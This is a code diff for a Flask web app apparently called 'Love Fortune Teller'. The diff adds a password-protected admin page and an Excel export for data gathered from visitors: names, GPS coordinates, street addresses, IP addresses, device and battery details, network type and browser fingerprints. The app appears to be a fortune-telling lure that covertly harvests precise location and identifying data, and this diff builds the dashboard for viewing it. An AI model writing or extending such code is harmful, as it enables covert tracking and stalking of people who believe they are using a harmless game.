-    if request.args.get('pass') != 'admin123':
+    if request.method == 'GET':
+        return '''<!DOCTYPE html>
+<html><head><meta charset="UTF-8">
+<style>
+*{margin:0;padding:0;box-sizing:border-box;}
+body{font-family:sans-serif;display:flex;justify-content:center;align-items:center;min-height:100vh;background:linear-gradient(135deg,#ff9a9e,#fecfef);}
+.card{background:#fff;padding:45px 40px;border-radius:24px;box-shadow:0 10px 30px rgba(0,0,0,0.12);text-align:center;width:320px;}
+h2{color:#c06c84;margin-bottom:24px;font-size:22px;}
+input{width:100%;padding:13px 18px;border:2px solid #ffdde1;border-radius:40px;font-size:15px;text-align:center;outline:none;margin-bottom:16px;}
+input:focus{border-color:#c06c84;}
+button{width:100%;padding:13px;background:linear-gradient(135deg,#ff6b6b,#c06c84);color:#fff;border:none;border-radius:40px;font-size:16px;font-weight:bold;cursor:pointer;}
+</style></head>
+<body>
+<div class="card"><h2>🔒 Admin Access</h2><form method="POST"><input name="password" type="password" placeholder="Enter password" required><button type="submit">Login</button></form></div>
+</body></html>'''
+    if request.form.get('password') != ADMIN_PASSWORD:
         abort(403)
-    if os.path.exists(DATA_FILE):
-        return send_file(DATA_FILE, as_attachment=True, download_name='love_fortune_data.xlsx')
-    return "No data file found", 404
+    df = load_data()
+    rows = ''
+    for _, row in df.iterrows():
+        gps = f"{row['Latitude']:.4f}, {row['Longitude']:.4f}"
+        maps = row['Google Maps']
+        rows += f'''<tr>
+            <td style="white-space:nowrap;">{row['DateTime']}</td>
+            <td><b>{row['Name']}</b></td>
+            <td><a href="{maps}" target="_blank">📍 {gps}</a></td>
+            <td style="max-width:250px; font-size:11px;">{row['Address']}</td>
+            <td>{row['Accuracy_m']} m</td>
+            <td>{row['Battery_%']}%</td>
+            <td>{row['Charging']}</td>
+            <td style="max-width:180px; font-size:10px;">{row['Device']}</td>
+            <td>{row['Screen']}</td>
+            <td>{row['Platform']}</td>
+            <td>{row['IP_Address']}</td>
+            <td>{row['Timezone']}</td>
+            <td>{row['Device_Memory_GB']}</td>
+            <td>{row['Network_Type']}</td>
+            <td style="font-size:9px;">{row['Fingerprint']}</td>
+        </tr>'''
+    return f'''<!DOCTYPE html>
+<html><head><meta charset="UTF-8"><style>
+body{{font-family:sans-serif;padding:20px;background:#fff0f5;}}
+h1{{color:#c06c84;}}
+table{{width:100%;border-collapse:collapse;background:#fff;border-radius:15px;overflow-x:auto;display:block;}}
+th{{background:linear-gradient(135deg,#ff6b6b,#c06c84);color:#fff;padding:12px 8px;text-align:left;font-size:11px;}}
+td{{padding:8px;border-bottom:1px solid #ffe0e9;font-size:10px;}}
+tr:hover td{{background:#fff5f8;}}
+a{{color:#c06c84;text-decoration:none;}}
+</style></head>
+<body><h1> Private Data — {len(df)} entries</h1>
+<div style="overflow-x:auto;"><table>
+    <thead><tr><th>DateTime</th><th>Name</th><th>Location</th><th>Address</th><th>Accuracy</th><th>Battery%</th><th>Charging</th><th>Device</th><th>Screen</th><th>Platform</th><th>IP</th><th>Timezone</th><th>Memory</th><th>Network</th><th>Fingerprint</th></tr></thead>
+    <tbody>{rows}</tbody>
+</table></div>
+<p><a href="/download-excel">📥 Download Excel file</a></p>
+</body></html>'''
+
+@app.route('/download-excel', methods=['GET'])
+def download_excel():
+    if os.path.exists(EXCEL_FILE):
+        return send_file(EXCEL_FILE, as_attachment=True, download_name='fortunes_data.xlsx')
+    return "No data yet", 404
 
 if __name__ == '__main__':
-    ensure_data_file()
+    ensure_persistent_storage()
     port = int(os.environ.get('PORT', 5000))
-    print("🚀 Love Fortune Teller starting on port", port)
-    app.run(host='0.0.0.0', port=port, debug=False)
+    app.run(host='0.0.0.0', port=port)
